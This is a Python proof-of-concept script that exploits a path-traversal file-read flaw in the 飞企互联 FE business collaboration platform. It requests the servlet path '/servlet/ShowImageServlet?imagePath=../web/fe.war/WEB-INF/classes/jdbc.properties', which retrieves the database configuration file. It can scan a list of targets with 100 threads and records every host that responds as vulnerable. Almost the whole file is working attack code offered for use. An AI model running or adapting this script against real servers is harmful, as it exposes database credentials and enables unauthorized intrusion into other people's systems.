import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________________  _______       ___________________
___  ____/_  __ \__  / / /__  /       ___  ____/__  ____/
__  /_   _  / / /_  /_/ /__  / _________  /_   __  __/   
_  __/   / /_/ /_  __  / _  /___/_____/  __/   _  /___   
/_/      \___\_\/_/ /_/  /_____/      /_/      /_____/   
                                                         """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='飞企互联 FE 业务协作平台 magePath 参数文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print'
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding':'gzip',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if 'mssql.jdbc' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()